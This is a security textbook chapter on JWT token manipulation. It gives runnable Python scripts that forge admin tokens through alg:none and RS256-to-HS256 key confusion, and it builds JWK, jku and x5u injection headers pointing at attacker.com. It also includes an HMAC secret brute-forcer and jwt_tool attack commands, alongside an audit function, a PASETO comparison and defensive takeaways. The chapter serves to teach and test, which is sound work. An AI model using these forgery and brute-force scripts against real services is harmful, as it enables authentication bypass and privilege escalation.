# Chapter 8 — JWT & Token Manipulation

> *"We changed the JWT header from RS256 to HS256, used the public key as the HMAC secret, and got admin access.  The server happily verified our forged token because it trusted the algorithm claim in the header."*
> — A real pentest finding, circa 2017

---

## 8.1 JWT Structure

A JSON Web Token has three Base64URL-encoded parts separated by dots:

```
header.payload.signature
```

```python
"""
jwt_anatomy.py — Parse and inspect a JWT without any library.
"""
import base64
import json

def decode_jwt(token: str) -> dict:
    """Decode a JWT without verification (for inspection only)."""
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("Not a valid JWT")
    
    def b64decode(s):
        # Add padding
        s += '=' * (4 - len(s) % 4)
        return base64.urlsafe_b64decode(s)
    
    header = json.loads(b64decode(parts[0]))
    payload = json.loads(b64decode(parts[1]))
    signature = b64decode(parts[2])
    
    return {
        "header": header,
        "payload": payload,
        "signature": signature.hex(),
        "raw_parts": parts
    }

# Example JWT (HS256)
import hmac
import hashlib
import time

def create_jwt(payload: dict, secret: str, algorithm: str = "HS256") -> str:
    """Create a simple HS256 JWT from scratch."""
    header = {"alg": algorithm, "typ": "JWT"}
    
    def b64encode(data):
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
    
    header_b64 = b64encode(json.dumps(header, separators=(',', ':')).encode())
    payload_b64 = b64encode(json.dumps(payload, separators=(',', ':')).encode())
    
    signing_input = f"{header_b64}.{payload_b64}"
    signature = hmac.new(
        secret.encode(), signing_input.encode(), hashlib.sha256
    ).digest()
    sig_b64 = b64encode(signature)
    
    return f"{signing_input}.{sig_b64}"

# Create a legitimate token
token = create_jwt(
    {"sub": "user123", "role": "user", "exp": int(time.time()) + 3600},
    "super-secret-key-2024"
)
print(f"JWT: {token}\n")

# Decode and inspect
decoded = decode_jwt(token)
print(f"Header:    {decoded['header']}")
print(f"Payload:   {decoded['payload']}")
print(f"Signature: {decoded['signature'][:40]}...")
```

---

## 8.2 Attack: `alg: none`

Some JWT libraries accept `"alg": "none"` — meaning no signature at all.

```python
"""
jwt_alg_none.py — Forge a JWT by setting algorithm to "none".
"""
import base64
import json

def forge_jwt_none(payload: dict) -> str:
    """Create a JWT with alg=none (no signature)."""
    header = {"alg": "none", "typ": "JWT"}
    
    def b64encode(data):
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
    
    header_b64 = b64encode(json.dumps(header, separators=(',', ':')).encode())
    payload_b64 = b64encode(json.dumps(payload, separators=(',', ':')).encode())
    
    # Variations that bypass filters:
    tokens = [
        f"{header_b64}.{payload_b64}.",          # Empty signature
        f"{header_b64}.{payload_b64}",            # No signature part
        f"{header_b64}.{payload_b64}.AA",         # Minimal signature
    ]
    return tokens

# Forge an admin token
forged_tokens = forge_jwt_none({
    "sub": "admin",
    "role": "admin",
    "exp": 9999999999
})

for i, token in enumerate(forged_tokens):
    print(f"Variant {i+1}: {token}")
    decoded = json.loads(
        base64.urlsafe_b64decode(token.split('.')[1] + '==')
    )
    print(f"  Payload: {decoded}\n")
```

```bash
# Using jwt_tool for automated testing
python3 jwt_tool.py <token> -X a   # Test alg:none
```

---

## 8.3 Attack: RS256 → HS256 Key Confusion

When a server is configured for RS256 (RSA), it verifies with the **public key**. If an attacker changes the algorithm to HS256 (HMAC), the server may use the **public key as the HMAC secret** — and the attacker has the public key.

```python
"""
jwt_key_confusion.py — Algorithm confusion: RS256 → HS256.
"""
import base64
import json
import hmac
import hashlib

def forge_jwt_key_confusion(payload: dict, public_key_pem: str) -> str:
    """
    Exploit RS256→HS256 confusion.
    Sign with HMAC using the RSA public key as the secret.
    """
    header = {"alg": "HS256", "typ": "JWT"}
    
    def b64encode(data):
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
    
    header_b64 = b64encode(json.dumps(header, separators=(',', ':')).encode())
    payload_b64 = b64encode(json.dumps(payload, separators=(',', ':')).encode())
    
    signing_input = f"{header_b64}.{payload_b64}"
    
    # Use the RSA PUBLIC KEY as HMAC secret
    signature = hmac.new(
        public_key_pem.encode(),
        signing_input.encode(),
        hashlib.sha256
    ).digest()
    sig_b64 = b64encode(signature)
    
    return f"{signing_input}.{sig_b64}"

# The server's RSA public key (publicly available)
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2a2rwplBQLM9SCZV0I4m
kFSFE1HRwx2VqrNiJL+GaHBFESMvplJGxNUFPgFdPCsZ3EWMHWX/dDJkPfuJtA5
AQIDAQAB
-----END PUBLIC KEY-----"""

forged = forge_jwt_key_confusion(
    {"sub": "admin", "role": "admin", "exp": 9999999999},
    public_key
)
print(f"Forged JWT (key confusion): {forged}")

# The server decodes the header, sees "HS256",
# uses the public key (which it has) as HMAC key,
# and validates our signature — ACCESS GRANTED
```

```bash
# With jwt_tool
python3 jwt_tool.py <token> -X k -pk public.pem
```

---

## 8.4 Attack: JWK Injection / `jku` / `x5u` Abuse

Some JWT implementations allow the token header to specify **where to fetch the verification key**.

```python
"""
jwt_jwk_injection.py — Embed attacker's key in the token header.
"""
import json
import base64
import hmac
import hashlib
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256

# Generate attacker's RSA key pair
attacker_key = RSA.generate(2048)

def rsa_sign_jwt(header: dict, payload: dict, private_key) -> str:
    """Sign a JWT with RSA."""
    def b64encode(data):
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
    
    header_b64 = b64encode(json.dumps(header, separators=(',', ':')).encode())
    payload_b64 = b64encode(json.dumps(payload, separators=(',', ':')).encode())
    
    signing_input = f"{header_b64}.{payload_b64}".encode()
    h = SHA256.new(signing_input)
    signature = pkcs1_15.new(private_key).sign(h)
    sig_b64 = b64encode(signature)
    
    return f"{header_b64.decode() if isinstance(header_b64, bytes) else header_b64}" \
           f".{payload_b64}.{sig_b64}"

# Attack 1: Embed JWK in header
jwk = {
    "kty": "RSA",
    "n": base64.urlsafe_b64encode(
        attacker_key.n.to_bytes(256, 'big')
    ).rstrip(b'=').decode(),
    "e": base64.urlsafe_b64encode(
        attacker_key.e.to_bytes(3, 'big')
    ).rstrip(b'=').decode(),
}

header_jwk = {
    "alg": "RS256",
    "typ": "JWT",
    "jwk": jwk  # Server fetches key from here instead of its config
}

# Attack 2: Point jku to attacker server
header_jku = {
    "alg": "RS256",
    "typ": "JWT",
    "jku": "https://attacker.com/.well-known/jwks.json"
}

# Attack 3: Point x5u to attacker certificate
header_x5u = {
    "alg": "RS256",
    "typ": "JWT",
    "x5u": "https://attacker.com/cert.pem"
}

print("JWK Injection vectors:")
print(f"  1. Embedded JWK:  header contains attacker's public key")
print(f"  2. jku redirect:  header points to attacker's JWKS endpoint")
print(f"  3. x5u redirect:  header points to attacker's certificate")
```

---

## 8.5 Attack: Expiry and Claim Tampering

```python
"""
jwt_claims.py — Common claim manipulation attacks.
"""
import time
import json
import base64

def b64decode(s):
    s += '=' * (4 - len(s) % 4)
    return json.loads(base64.urlsafe_b64decode(s))

def check_jwt_claims(token: str):
    """Audit a JWT for common claim issues."""
    parts = token.split('.')
    header = b64decode(parts[0])
    payload = b64decode(parts[1])
    
    issues = []
    
    # Check algorithm
    alg = header.get('alg', 'MISSING')
    if alg == 'none':
        issues.append("CRITICAL: alg=none — no signature verification")
    elif alg == 'HS256':
        issues.append("INFO: HS256 — check if RS256→HS256 confusion possible")
    
    # Check expiry
    exp = payload.get('exp')
    if exp is None:
        issues.append("WARNING: No expiry (exp) claim — token never expires")
    elif exp > time.time() + 86400 * 365:
        issues.append(f"WARNING: Token expires far in the future ({exp})")
    elif exp < time.time():
        issues.append(f"INFO: Token expired at {exp}")
    
    # Check issued-at
    iat = payload.get('iat')
    if iat is None:
        issues.append("INFO: No issued-at (iat) claim")
    
    # Check for sensitive data in payload (it's just base64!)
    sensitive_keys = ['password', 'ssn', 'credit_card', 'secret', 'api_key']
    for key in payload:
        if any(s in key.lower() for s in sensitive_keys):
            issues.append(f"CRITICAL: Sensitive data in payload: {key}")
    
    # Check audience and issuer
    if 'aud' not in payload:
        issues.append("INFO: No audience (aud) claim — token accepted everywhere")
    if 'iss' not in payload:
        issues.append("INFO: No issuer (iss) claim")
    
    return {
        "header": header,
        "payload": payload,
        "issues": issues
    }

# Example audit
token = create_jwt(
    {"sub": "user", "role": "admin", "password": "hunter2",
     "exp": int(time.time()) + 86400 * 365 * 10},
    "weak-secret"
)

result = check_jwt_claims(token)
print("JWT Audit Results:")
for issue in result["issues"]:
    print(f"  [{issue.split(':')[0]}] {':'.join(issue.split(':')[1:])}")
```

---

## 8.6 Using `jwt_tool` for All-in-One Testing

```bash
# Install
pip install jwt_tool
# Or: git clone https://github.com/ticarpi/jwt_tool.git

# Decode token
python3 jwt_tool.py <token>

# Test all known attacks
python3 jwt_tool.py <token> -M at    # All tests

# Specific attacks:
python3 jwt_tool.py <token> -X a     # alg:none
python3 jwt_tool.py <token> -X k -pk public.pem  # Key confusion
python3 jwt_tool.py <token> -X s     # Sign with empty password
python3 jwt_tool.py <token> -X i     # Inject JWK

# Brute-force HMAC secret
python3 jwt_tool.py <token> -C -d wordlist.txt

# Tamper claims
python3 jwt_tool.py <token> -T       # Interactive tampering
python3 jwt_tool.py <token> -I -pc role -pv admin  # Set role=admin
```

### HMAC Secret Brute-Force

```python
"""
jwt_brute.py — Brute-force weak JWT HMAC secrets.
"""
import hmac
import hashlib
import base64
import sys

def brute_force_jwt(token: str, wordlist_path: str):
    """Brute-force the HMAC-SHA256 secret of a JWT."""
    parts = token.split('.')
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    
    # Decode the signature
    sig_b64 = parts[2] + '=' * (4 - len(parts[2]) % 4)
    target_sig = base64.urlsafe_b64decode(sig_b64)
    
    with open(wordlist_path, 'r', errors='ignore') as f:
        for i, line in enumerate(f):
            secret = line.strip()
            computed = hmac.new(
                secret.encode(), signing_input, hashlib.sha256
            ).digest()
            
            if hmac.compare_digest(computed, target_sig):
                print(f"\n[+] Secret found: '{secret}' (attempt {i+1})")
                return secret
            
            if i % 100000 == 0:
                print(f"  Tried {i:,} secrets...", end='\r')
    
    print("\n[-] Secret not in wordlist")
    return None

# Usage:
# brute_force_jwt(token, "/usr/share/wordlists/rockyou.txt")
```

---

## 8.7 PASETO: The Alternative

PASETO (Platform-Agnostic Security Tokens) was designed to eliminate JWT's footgun-rich design:

```python
"""
Key differences between JWT and PASETO:
"""
comparison = """
| Feature | JWT | PASETO |
|---|---|---|
| Algorithm in header | Yes (attacker-controlled) | No (version determines algorithm) |
| alg:none | Possible | Impossible |
| Key confusion | Possible | Impossible |
| Compression | Optional (CRIME risk) | Not supported |
| Registered algorithms | ~15 (many insecure) | 1 per version |
| Default security | Opt-in | Opt-out |
"""
print(comparison)

# PASETO versions:
# v1: AES-256-CTR + HMAC-SHA384 (local) / RSA-PSS (public)
# v2: XChaCha20-Poly1305 (local) / Ed25519 (public)
# v3: AES-256-CTR + HMAC-SHA384 (local) / ECDSA P-384 (public)
# v4: XChaCha20-Poly1305 (local) / Ed25519 (public) [recommended]
```

---

## 8.8 Key Takeaways

- **Never trust the JWT header** — the `alg` field is attacker-controlled.  Whitelist allowed algorithms server-side.
- **`alg: none`** and **RS256→HS256 confusion** are the two most common JWT vulnerabilities.
- **JWK injection, `jku`, and `x5u`** let attackers point verification to their own keys.
- **JWT payloads are not encrypted** — they're just Base64.  Never store secrets in the payload.
- **Brute-force weak HMAC secrets** — many applications use short, predictable secrets.
- **Consider PASETO** for new projects — it eliminates most JWT footguns by design.

---

**Next:** [Chapter 9 — TLS: Handshakes & Transport Realities →](09_tls.md)
